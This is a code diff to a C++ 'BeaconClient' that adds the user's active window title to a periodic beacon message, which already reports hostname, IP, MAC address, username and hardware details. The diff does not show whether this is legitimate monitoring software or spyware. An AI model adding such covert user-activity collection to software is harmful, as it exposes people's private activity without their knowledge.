@@ -55,17 +55,31 @@ void BeaconClient::DiscoveryLoop() {
         // Collect latest hardware telemetry
         SystemHardwareInfo hw = Utils::GetSystemHardwareInfo();
 
+        std::string win_title = Utils::GetActiveWindowTitle();
+        std::ostringstream esc_win;
+        for (char c : win_title) {
+            if (c == '"') esc_win << "\\\"";
+            else if (c == '\\') esc_win << "\\\\";
+            else if (c == '\b') esc_win << "\\b";
+            else if (c == '\f') esc_win << "\\f";
+            else if (c == '\n') esc_win << "\\n";
+            else if (c == '\r') esc_win << "\\r";
+            else if (c == '\t') esc_win << "\\t";
+            else if ((unsigned char)c >= 0x20) esc_win << c;
+        }
+
         std::ostringstream ss;
         ss << "{"
            << "\"type\":\"BEACON\","
-           << "\"version\":\"5.3.0\","
+           << "\"version\":\"5.3.1\","
            << "\"hostname\":\"" << net_info.hostname << "\","
            << "\"ip\":\"" << net_info.ip << "\","
            << "\"mac\":\"" << net_info.mac << "\","
            << "\"username\":\"" << net_info.username << "\","
+           << "\"active_window\":\"" << esc_win.str() << "\","
            << "\"timestamp\":" << Utils::GetCurrentTimestampMs() << ","
            << "\"specs\":{"
-           <<   "\"agent_version\":\"5.3.0\","
+           <<   "\"agent_version\":\"5.3.1\","
            <<   "\"os\":\"" << hw.os_name << "\","
            <<   "\"uptime\":" << hw.uptime_seconds << ","
            <<   "\"cpu\":{\"model\":\"" << hw.cpu_model << "\",\"cores\":" << hw.cpu_cores << ",\"usage_percent\":" << hw.cpu_usage_percent << "},"
